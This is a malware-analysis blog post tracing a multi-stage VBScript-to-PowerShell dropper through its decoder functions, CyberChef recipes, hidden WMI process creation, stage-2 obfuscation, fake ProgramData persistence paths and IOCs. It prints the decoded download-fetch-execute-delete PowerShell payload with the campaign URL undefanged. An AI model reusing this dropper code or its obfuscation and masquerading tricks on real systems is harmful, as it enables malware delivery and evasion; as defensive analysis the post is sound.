---
layout: post
title: "Multi-Stage Dropper Analysis: VBScript to PowerShell"
date: 2026-02-01
categories: [ malware ]
permalink: /malware/vbscript-dropper-analysis/
tags: [malware-analysis, vbscript, powershell, obfuscation, cyberchef, homelab]
image: assets/images/malware/vbscript-dropper/20-cyberchef-success.png
---

## Intro

I came across a multi-stage dropper that uses VBScript and PowerShell with several layers of obfuscation. The sample came from an active campaign hosting content on `terazosine.fit`. I wanted to manually work through the deobfuscation instead of just running it to see what techniques were being used.

This ended up taking longer than I expected. Lots of wrong turns in CyberChef before I figured out the right recipe.

## Finding the Execution Mechanism

I opened the sample in Notepad++ and used the JSFormat plugin to clean up the structure. The raw file was a mess of concatenated strings and weird variable names.

First thing I tried was searching for common VBScript execution methods. I searched for `Execute`, `Eval`, `Run`, and `Shell` but came up empty.

Then I searched for `GetObject` and got a hit:

![GetObject search results in Notepad++](/blog/assets/images/malware/vbscript-dropper/09-getobject-found.png)
*Figure 1: Found GetObject which is used for WMI execution*

This is how the malware calls out to WMI. But the actual commands being passed to it were all obfuscated. I needed to find the decoder functions.

## Finding the Decoder Functions

I searched for "Function" in Notepad++ and found 15 hits. Scrolling through them, I could see four functions that looked like they were doing the decoding work:

![Function search showing decoder functions](/blog/assets/images/malware/vbscript-dropper/01-decoder-functions.png)
*Figure 2: Search results showing the decoder functions*

The function names are all garbage strings like `RWYGDTJTOHTCVIJCTKNJXY` but you can see them being called in the search results at the bottom. I needed to figure out what each one does.

## The ASCII Shift Function

The first function I looked at was `RWYGDTJTOHTCVIJCTKNJXY`. Looking at the code:

![ASCII shift function code](/blog/assets/images/malware/vbscript-dropper/02-ascii-shift-function.png)
*Figure 3: The ASCII shift function*

This one loops through each character, gets the ASCII value with `Asc()`, subtracts 1, then converts back to a character with `Chr()`. Classic Caesar cipher with a shift of 1.

## The String Reversal Function

The next function `LOOIMKHOROIYNCTVGPKNGC` looked more complicated because it has XOR operations:

![String reversal function with XOR](/blog/assets/images/malware/vbscript-dropper/13-reversal-function.png)
*Figure 4: The reversal function*

I stared at this for a while before I realized the XOR operations completely cancel out. It XORs a value, then XORs it again with the same key. `A XOR B XOR B = A`. So all this function actually does is reverse the string. The XOR is just there to make it look more complex.

## The Hex Decode and XOR Function

The third function `PIBCVBCJVWQYLJMSLLGTXM` does hex decoding plus XOR:

![Hex decode and XOR function](/blog/assets/images/malware/vbscript-dropper/14-hex-xor-function.png)
*Figure 5: Hex decode with XOR*

It reads hex pairs from the input, converts them to bytes, then XORs each byte with a character from the key. The key cycles if the input is longer than the key.

## The Array Lookup Function

The fourth function `WBSWDTGSJCVPTRBKRAJRUO` uses a Select Case to return different encoded values:

![Array lookup function with Case statements](/blog/assets/images/malware/vbscript-dropper/12-array-lookup-function.png)
*Figure 6: Array lookup function*

So `WBSWDTGSJCVPTRBKRAJRUO(2)` returns whatever encoded value is stored in Case 2.

## Finding the Encoded Payloads

The actual encoded strings were stored as properties on a custom object. I searched for the object name and found all the assignments:

![Encoded payloads stored in object properties](/blog/assets/images/malware/vbscript-dropper/04-encoded-payloads.png)
*Figure 7: The encoded payload strings*

I noticed something weird here. The hex strings have characters that aren't valid hex: colons (`:`) and the letter `g`. These get stripped during decoding. Another layer of obfuscation.

## CyberChef: Decoding the XOR Key

Now I had to actually decode these strings. I figured CyberChef would make quick work of it. I was wrong.

The XOR key was stored as `EMTJSDDRKIFGIKQWNIMD` and needed to be decoded through the ASCII shift function first (subtract 1 from each character).

I dropped it into CyberChef with an ADD operation set to -1. First try with HEX mode selected:

![CyberChef with HEX mode showing wrong output](/blog/assets/images/malware/vbscript-dropper/10-cyberchef-hex-wrong.png)
*Figure 8: Wrong! HEX mode gave me the wrong output*

The output was `FNUKTEESLJGHJLRXOJNE`. That's wrong because it shifted UP by 1 instead of down. The -1 was being interpreted as a hex value.

I switched the dropdown from HEX to DECIMAL:

![CyberChef with DECIMAL mode showing correct output](/blog/assets/images/malware/vbscript-dropper/11-cyberchef-decimal-correct.png)
*Figure 9: Correct! DECIMAL mode gave the right XOR key*

Output: `DLSIRCCQJHEFHJPVMHLC`. That's the decoded XOR key. I made a note of it:

![Notes with decoded XOR key](/blog/assets/images/malware/vbscript-dropper/15-notes-xor-key.png)
*Figure 10: My notes tracking the XOR key*

## Building the Full CyberChef Recipe

Now I needed to chain all the decode operations together. Based on my analysis of the functions, I thought the encoding was:

1. XOR with key
2. To Hex
3. Reverse
4. ADD +1
5. Reverse again

So to decode I would need to do the opposite in reverse order.

First attempt at the full recipe:

![CyberChef first attempt with garbage output](/blog/assets/images/malware/vbscript-dropper/16-cyberchef-wrong-order.png)
*Figure 11: First attempt. Garbage output with control characters.*

That's clearly not right. The output is showing control characters and random symbols.

I tried rearranging the operations:

![CyberChef second attempt still garbage](/blog/assets/images/malware/vbscript-dropper/18-cyberchef-still-garbage.png)
*Figure 12: Still garbage. Something is wrong with my operation order.*

At this point I was getting frustrated. I went back to the VBScript code and traced through it more carefully.

## What I Was Getting Wrong

Looking at how the functions are actually called:

```
PIBCVBCJVWQYLJMSLLGTXM(LOOIMKHOROIYNCTVGPKNGC(RWYGDTJTOHTCVIJCTKNJXY(...)))
```

The innermost function runs first. So the encoding order is:
1. `RWYGDTJTOHTCVIJCTKNJXY` runs first (ASCII shift +1)
2. `LOOIMKHOROIYNCTVGPKNGC` runs second (Reverse)
3. `PIBCVBCJVWQYLJMSLLGTXM` runs third (Hex + XOR)

I had the order wrong. I tried again with different orderings:

![CyberChef another wrong attempt](/blog/assets/images/malware/vbscript-dropper/19-cyberchef-wrong-order2.png)
*Figure 13: Another wrong attempt. Still getting garbage.*

The XOR was in the wrong position in my recipe.

## Finally Getting It Right

After more trial and error, I got it working:

![CyberChef success showing decoded WMI string](/blog/assets/images/malware/vbscript-dropper/20-cyberchef-success.png)
*Figure 14: Success! The decoded WMI connection string.*

The output is `winmgmts:{impersonationLevel=impersonate,authenticationLevel=pktPrivacy}!\`

That's the WMI connection string. Finally making progress.

The working recipe:
1. Reverse (Character)
2. ADD -1 (DECIMAL)
3. Reverse (Character)
4. From Hex
5. XOR with key `DLSIRCCQJHEFHJPVMHLC`

## Decoded WMI Execution

Running all the encoded strings through my recipe, I built up the complete picture:

![All decoded strings in Notepad++](/blog/assets/images/malware/vbscript-dropper/05-decoded-wmi-dropper.png)
*Figure 15: All the decoded strings showing the WMI execution and dropper code*

The VBScript uses WMI to spawn a hidden PowerShell process:

```
winmgmts:{impersonationLevel=impersonate,authenticationLevel=pktPrivacy}!\
Win32_ProcessStartup
Win32_Process
.ShowWindow = 0
.Create()
```

The `impersonationLevel=impersonate` and `authenticationLevel=pktPrivacy` flags mean it can impersonate the client and encrypts the WMI traffic. `ShowWindow = 0` hides the window.

## The Base64 PowerShell Payload

The PowerShell command used `-ExecutionPolicy Bypass -EncodedCommand` followed by Base64. I decoded it with UTF-16LE (standard for PowerShell encoded commands):

```powershell
$url='https://terazosine.fit/NKLZHRSXAPCIQHNBLSOV'
$NYXDDXXNNFIBJRBAQPTVZI = Join-Path ([System.IO.Path]::GetTempPath()) 'NYXDDXXNNFIBJRBAQPTVZI'
$JYQGBUBSINFEGPWOEVMKSU = Join-Path $NYXDDXXNNFIBJRBAQPTVZI 'TLGQKFDYDJZAQZHJDWCCVR.ps1'
$EKHBJJXVXCQPGVRMWEHRVZ = (iwr $url -UseBasicParsing).Content
New-Item -ItemType Directory -Path $NYXDDXXNNFIBJRBAQPTVZI -Force
$EKHBJJXVXCQPGVRMWEHRVZ | Out-File -FilePath $JYQGBUBSINFEGPWOEVMKSU
& $JYQGBUBSINFEGPWOEVMKSU
Remove-Item -Path $JYQGBUBSINFEGPWOEVMKSU -Force
Remove-Item -Path $NYXDDXXNNFIBJRBAQPTVZI -Force
```

Standard dropper: download to temp, execute, delete.

## Stage 2: PowerShell Analysis

I fetched the second stage payload (178KB) and transferred it to my isolated FLARE VM. It was a different obfuscation style than stage 1.

## Character Index Array Obfuscation

The first thing I noticed was commands being built by indexing into scrambled strings:

![PowerShell with index array obfuscation](/blog/assets/images/malware/vbscript-dropper/06-powershell-index-decode.png)
*Figure 16: Decoding the index arrays in PowerShell*

```powershell
("OHbM8XB2e-cGYqyRtK1AUwJEufPL79mDsvTg6V1Sh0Crka4ZNnp3jWxiIozFd5Q")[34,8,32,16,9,26,45,16,40] -join ''
```

I ran these directly in PowerShell on the isolated VM. The outputs were `Test-Path`, `New-Item`, and `start-sleep`.

## Substring Extraction from Decoy Strings

This was the clever one. Large blocks of security-themed text that look like comments:

![Substring obfuscation with decoy text](/blog/assets/images/malware/vbscript-dropper/08-substring-obfuscation.png)
*Figure 17: Decoy strings with intentional typos for character extraction*

```powershell
$YDTWTCAWMMHEIOF = "Hashing, a core concept in cryptography, is used to verify data integrity..."
$WVYFQANABLXCBEIHIWV = $YDTWTCAWMMHEIOF.Substring(86, 1)
```

The text has intentional typos and weird capitalization like "Multi-faCtor" with a capital C. The script extracts specific characters at specific positions to build up commands. Someone skimming the code might think these are legitimate comments.

## Persistence Paths

The dropper creates directories in `C:\ProgramData\` that look like legitimate Microsoft paths:

![Persistence paths in ProgramData](/blog/assets/images/malware/vbscript-dropper/07-persistence-paths.png)
*Figure 18: Fake Microsoft paths for persistence*

The paths use real Microsoft folder names like `OneAuth`, `PackageCache`, `DeliveryOptimization` combined in ways that look plausible but don't exist on a clean system:

- `C:\ProgramData\OneAuth\Microsoft\PackagedEventProviders\DeliveryOptimization\`
- `C:\ProgramData\PackageCache\Microsoft\INetCache\PackagedEventProviders\`
- `C:\ProgramData\DeliveryCurrentControlSet\SessionManager\Optimization\`

## IOCs

**URLs:**
- `hxxps://terazosine[.]fit/LAQVLANAMIKWWFMEZJVV` (Stage 1)
- `hxxps://terazosine[.]fit/NKLZHRSXAPCIQHNBLSOV` (Stage 2)
- `hxxps://terazosine[.]fit/VIFLAIEPJXVSSVDEWHXT` (Password.txt decoy)

**Persistence Paths:**
- `C:\ProgramData\OneAuth\Microsoft\PackagedEventProviders\`
- `C:\ProgramData\PackageCache\Microsoft\INetCache\`
- `C:\ProgramData\DeliveryCurrentControlSet\`

**MITRE ATT&CK:**
- T1059.001 (PowerShell)
- T1059.005 (Visual Basic)
- T1047 (Windows Management Instrumentation)
- T1027 (Obfuscated Files or Information)
- T1036.005 (Match Legitimate Name or Location)

## Lessons Learned

The CyberChef struggles taught me to trace through the actual function call order more carefully. When functions are nested like `func1(func2(func3(...)))`, the innermost function runs first. I kept applying decode operations in the wrong order.

The multi-layer obfuscation isn't doing anything novel. ASCII shifts, XOR, hex encoding, string reversal. All basic techniques. But chaining them together and putting the key in obfuscated form too makes manual analysis tedious.

Would like to see what the final payload does after establishing persistence but the C2 was already down.

---

*Analysis performed on isolated FLARE VM. IOCs defanged for safety.*
